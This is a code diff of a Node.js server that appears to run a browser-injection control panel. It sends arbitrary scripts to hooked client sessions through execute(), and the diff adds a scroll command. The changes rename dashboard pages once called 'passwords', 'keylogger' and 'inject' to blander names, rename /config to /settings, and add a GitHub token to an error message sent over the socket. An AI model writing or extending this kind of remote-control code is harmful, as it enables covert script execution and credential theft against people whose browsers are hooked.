@@ -531,7 +531,8 @@ MongoClient.connect(config.mongodb, (err, client) => {
           console.log(chalk.redBright('[auth:github/token] '), error.message)
           socket.emit('auth:github/stale', {
             title: error.title.toString(),
-            message: error.message.toString()
+            message: error.message.toString(),
+            token
           })
         })
       }
@@ -608,7 +609,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
         project,
         page
       } = data
-      let pages = ['overview', 'passwords', 'keylogger', 'inject', 'config']
+      let pages = ['overview', 'console', 'data', 'config']
 
       if (globalToken) {
         if (project && page && pages.includes(page)) {
@@ -1175,9 +1176,10 @@ MongoClient.connect(config.mongodb, (err, client) => {
         token,
         id,
         script,
+        scroll,
         recursive
       } = data
-      if (project && (recursive || (typeof token === 'string' && (typeof id === 'string' || typeof id === 'undefined'))) && typeof script === 'string' && globalToken) {
+      if (project && (recursive || (typeof token === 'string' && (typeof id === 'string' || typeof id === 'undefined'))) && (typeof script === 'string' || scroll)  && globalToken) {
         getUser(globalToken).then(user => {
           getProject(project, user).then(thisProject => {
             if (inject.clients[thisProject.doc['_id']]) {
@@ -1185,7 +1187,11 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 Object.keys(inject.clients[thisProject.doc['_id']]).forEach(token => {
                   if (inject.clients[thisProject.doc['_id']][token] && inject.clients[thisProject.doc['_id']][token].sessions) {
                     inject.clients[thisProject.doc['_id']][token].sessions.forEach(client => {
-                      client.execute(script)
+                      if (scroll) {
+                        client.scroll(script)
+                      } else {
+                        client.execute(script)
+                      }
                     })
                   }
                 })
@@ -1193,7 +1199,11 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 if (inject.clients[thisProject.doc['_id']][token] && inject.clients[thisProject.doc['_id']][token].sessions) {
                   inject.clients[thisProject.doc['_id']][token].sessions.forEach(client => {
                     if (client) {
-                      client.execute(script)
+                      if (scroll) {
+                        client.scroll(script)
+                      } else {
+                        client.execute(script)
+                      }
                     }
                   })
                 } else {
@@ -1206,7 +1216,11 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 if (inject.clients[thisProject.doc['_id']][token] && inject.clients[thisProject.doc['_id']][token].sessions) {
                   let client = inject.clients[thisProject.doc['_id']][token].sessions.find(c => c.id === id)
                   if (client) {
-                    client.execute(script)
+                    if (scroll) {
+                      client.scroll(script)
+                    } else {
+                      client.execute(script)
+                    }
                   } else {
                     socket.emit('err', {
                       title: 'Failed to execute!',
@@ -1699,7 +1713,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
     })
     app.use('/*', (req, res) => {
       if (req.url.substr(0, 9) === '/cdn-cgi/') return
-      if (req.originalUrl === '/config') req.originalUrl = '/'
+      if (req.originalUrl === '/settings') req.originalUrl = '/'
       request('http://localhost:8080' + req.originalUrl).pipe(res)
     })
   } else {
@@ -1716,7 +1730,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
         res.sendFile(path.join(__dirname, '../interface/public/index.html'))
       }
     })
-    app.use('/config', (req, res) => {
+    app.use('/settings', (req, res) => {
       res.sendFile(path.join(__dirname, '../interface/public/index.html'))
     })
     app.use(express.static(path.join(__dirname, '../interface/public')))
